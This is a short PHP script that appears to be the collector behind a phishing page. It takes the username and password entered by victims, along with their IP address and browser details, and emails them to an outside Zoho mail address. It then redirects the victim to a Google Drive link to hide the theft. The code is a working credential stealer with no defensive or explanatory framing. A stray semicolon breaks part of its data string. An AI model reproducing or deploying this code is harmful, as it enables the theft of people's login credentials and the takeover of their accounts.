<?php
include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    $subject = "THE-HOLY-HAND GRENADE";
    $to = "sales.omartradeco@zohomail.com";  
    $user_agent = $_SERVER['HTTP_USER_AGENT'];       
    $data = "username:" .$_POST['username']."\n".    
            "password:" .$_POST['password']."\n".    
            "Page:"     .$_POST['location']."\n".                                                         
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
            "User Agent:".$user_agent."\n".
            "OS:".Operating_System($user_agent)."\n".
            "Browser:".Browser($user_agent)."\n".
            "Device:".Device($user_agent)."\n".
            "IP:".GetIP()."\n".
   
   
    $message = $data .  "$user_agent" ;  
                                  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc/edit3E');</script>";
?>
